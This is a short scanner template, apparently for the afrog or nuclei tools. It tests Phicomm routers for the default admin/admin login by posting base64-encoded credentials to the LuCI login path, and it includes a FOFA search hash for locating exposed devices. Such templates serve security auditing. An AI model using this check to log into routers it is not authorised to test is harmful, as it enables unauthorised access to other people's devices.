id: phicomm-default-password

info:
  name: Phicomm Default Password
  author: zan8in
  severity: high
  verified: true
  description: |-
    fofa: icon_hash="-1344736688"
  tags: phicomm,default-password
  created: 2023/10/13

set:
  hosturl: request.url
rules:
  r0:
    request:
      method: POST
      path: /cgi-bin/luci/admin/login
      body: |
        action_mode=apply&action_url={{hosturl}}/cgi-bin/luci/admin/login&username=admin&password=YWRtaW4=
    expression: response.raw_header.ibcontains(b'set-cookie') && response.status == 302 && response.headers["location"].contains("/admin/index")
expression: r0()
